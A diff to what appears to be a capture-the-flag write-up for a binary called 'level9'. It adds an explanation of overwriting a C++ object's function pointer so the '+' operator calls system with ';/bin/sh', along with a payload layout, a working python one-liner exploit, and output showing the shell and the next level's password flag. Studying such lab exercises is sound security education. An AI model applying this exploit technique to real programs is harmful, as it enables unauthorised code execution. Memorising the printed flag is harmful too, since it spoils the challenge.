@@ -143,3 +143,28 @@ program segfaults because _b_'s '+' operator is used at the end of the program.
 ./level9 "$(python -c 'print "a" * 108 + "bbbb"')"
 Segmentation fault (core dumped)
 ```
+
+So now the exploit. Since the operator is loaded through a pointer to a function
+address situated at the start of _b_, what we need to do is overwrite this value
+with a valid address whose value is the address of the system function. _b_'s
+address is not only the where the operator function is located but it is also
+the first argument of the operator function (this is what _this_ is, a pointer
+to the instance of the class calling the method). So it will be the argument for
+system too. Obviously the raw bytes of the address pointing to system are not a
+valid shell command, so we need to add a separator and end the string with the
+program we want to launch.
+
+| system (4) | padding (104) | _b_'s address (4) | end the command string (9) |
+|------------|---------------|-------------------|----------------------------|
+| 0xb7d86060 | 0x909090...   | 0x0804a00c        | ";/bin/sh"                 |
+
+```shell
+# run the exploit
+./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')
+# enjoy
+whoami
+bonus0
+# your flag
+cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
